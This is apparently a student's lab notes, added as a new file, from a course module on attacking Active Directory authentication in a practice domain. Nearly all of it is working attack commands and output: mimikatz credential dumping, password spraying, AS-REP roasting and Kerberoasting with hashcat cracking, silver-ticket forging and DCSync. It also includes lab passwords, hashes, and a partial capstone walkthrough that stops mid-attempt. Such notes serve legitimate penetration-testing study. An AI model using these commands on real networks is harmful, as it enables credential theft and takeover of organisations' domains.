@@ -1,0 +1,150 @@
+Attacking Active Directory Authentication
+
+NTLM Authentication
+
+Kerberos Authentication
+
+Cached AD Credentials
+
+dump the credentials:
+cd C:\Tools
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+* NTLM     : 2688c6d2af5e9c7ddb268899123744ea
+* SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
+
+cache service ticket:
+dir \\web04.corp.com\backup
+sekurlsa::tickets
+Group 0 - Ticket Granting Service
+Group 2 - Ticket Granting Ticket
+
+------------
+Performing Attacks on Active Directory Authentication
+
+Password Attacks
+
+password spraying:
+net accounts (account lockout/retry windows)
+cd C:\Tools
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+
+spraying attack against AD users leverages SMB:
+cat users.txt
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+sparying attack obtaining a TGT:
+type .\usernames.txt
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+--------
+AS-REP Roasting
+
+using hashcat:
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+(Do not require Kerberos preauthentication enabled, UAC 0x410200)
+hashcat --help | grep -i "Kerberos"
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+using Rubeus:
+cd C:\Tools
+.\Rubeus.exe asreproast /nowrap
+sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+---------
+Kerberoasting (TGS-REP)
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+cat hashes.kerberoast
+hashcat --help | grep -i "Kerberos"
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+another:
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+--------
+Silver Tickets (target SPN)
+
+iwr -UseDefaultCredentials http://web04
+privilege::debug
+sekurlsa::logonpasswords
+whoami /user
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+exit
+klist
+iwr -UseDefaultCredentials http://web04
+
+----------
+Domain Controller Synchronization
+
+cd C:\Tools\
+.\mimikatz.exe
+lsadump::dcsync /user:corp\dave
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+another:
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
+------
+Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. To perform the initial enumeration steps you can use pete with the password Nexus123!. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.
+
+dc1 192.168.55.70 
+client75 192.168.55.75
+attacker 192.168.49.55
+pete/Nexus123!
+
+impacket-GetNPUsers -dc-ip 192.168.55.70 -request -outputfile hashes.asreproast corp.com/pete
+Nexus123!
+hashes.asreproast
+
+$krb5asrep$23$mike@CORP.COM:c2686777f8c1a99dcb1b944d6cc8851a$ff7847779dfff979b1fa55c02d7cec229ba0ac8b04f06c046d88fc5aa80719d4619aa8c3cc25fa7949545832cbf8deb02fad60ccadd83a3b0103df1402a393c5a2a9cca1f580e80ffce42514adb2f58b900bd310d33e901c663e3a2c124e415f240e7c9e4661782eff452bdfa9313e0f01e6da956789d53a9f841d01d245be3378a780b706f51e0d218b7b12a429324e922cb1a8c54256c5f513e02b3f100c2e5b821e300ff9bd26704907a23289ae64cf928abb44ddbc0e89618a56fecfef975c399b416b715d8d7c83c315f7f34670cb22fcd8561549e84507561f37afc69549e2fc5e
+$krb5asrep$23$dave@CORP.COM:b212c8b6138c60ec60937ac43b7f7913$ecf0c96625fa5e1a10bbc857eb7a02d596b59b66a29b1a9d417978020f402907c51cc2fdb926cd2103fce8bb916da3e4115f2621d47afc123abb5d4af6446e7f6ff60174d3695c932a968854365a78026176addaeab018fc886cc0279d4ee2dcc71621cbf51f1f06df6a091b1e2abf890b78ca6e12851c953d502417bf70b7ebd34613b69dd21c86896ef861ee78b195f1cd90f4f220bde70c26510078887d3798e7c8afde23a33013625b8fcc22cfed933d44bfb99e2381e34d55a1c522580f99740f6108ba26d2393f6b3409754e74f9573b235f002f251374942f04a542a876ef4227
+
+rule:
+.
+$1
+$!
+
+gzip -dk /usr/share/wordlists/rockyou.txt.gz
+hashcat -m 18200 -a 0 -r rule hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+
+$krb5asrep$23$mike@CORP.COM:c2686777f8c1a99dcb1b944d6cc8851a$ff7847779dfff979b1fa55c02d7cec229ba0ac8b04f06c046d88fc5aa80719d4619aa8c3cc25fa7949545832cbf8deb02fad60ccadd83a3b0103df1402a393c5a2a9cca1f580e80ffce42514adb2f58b900bd310d33e901c663e3a2c124e415f240e7c9e4661782eff452bdfa9313e0f01e6da956789d53a9f841d01d245be3378a780b706f51e0d218b7b12a429324e922cb1a8c54256c5f513e02b3f100c2e5b821e300ff9bd26704907a23289ae64cf928abb44ddbc0e89618a56fecfef975c399b416b715d8d7c83c315f7f34670cb22fcd8561549e84507561f37afc69549e2fc5e:Darkness1099!
+
+mike
+Darkness1099!
+
+xfreerdp3 /u:mike /d:corp.com /v:192.168.55.70
+
+[03:54:44:497] [2969:00000b9b] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Cannot contact any KDC for realm 'CORP.COM' [-1765328228]) !
+
+rdesktop -u mike -d corp.com -p Darkness1099! 192.168.55.70
+no right to remote desktop services !
+
+impacket-psexec 'corp.com/mike:Darkness1099!'@192.168.55.70
+[*] Requesting shares on 192.168.55.70.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+                                       
+not work !
+maria? not mike?
+
+another approaching:
+xfreerdp3 /u:jeff /d:corp.com /v:192.168.55.75
+jeff/HenchmanPutridBonbon11
+
+[06:36:33:489] [3841:00000f03] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Cannot contact any KDC for realm 'CORP.COM' [-1765328228]) !
+
+cd C:\Tools
+.\Rubeus.exe asreproast /nowrap
+
+
+
+
+
+
+
